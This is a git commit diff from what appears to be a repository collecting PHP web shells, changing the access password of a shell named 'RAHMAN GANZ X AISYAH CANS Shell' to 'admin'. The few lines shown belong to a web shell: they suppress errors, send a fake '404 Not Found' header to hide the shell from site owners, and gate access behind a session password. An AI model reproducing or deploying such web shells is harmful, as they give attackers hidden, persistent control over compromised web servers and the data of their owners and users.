a04a19f220d4609c18c3862598b1bb45203d2921
1337r0j4n <84887432+1337r0j4n@users.noreply.github.com>
2023-10-25 12:38:03 +0630

    Update shell.php

--- SHELLs/RAHMAN GANZ X AISYAH CANS Shell/shell.php
+++ SHELLs/RAHMAN GANZ X AISYAH CANS Shell/shell.php
@@ -5,7 +5,7 @@
 error_reporting(0);
 header('HTTP/1.0 404 Not Found', true, 404);
 session_start();
-$pass = "AisyahCans403";
+$pass = "admin";
 $link = "fvck.txt";
 if($_POST['password'] == $pass) {
   $_SESSION['forbidden'] = $pass;
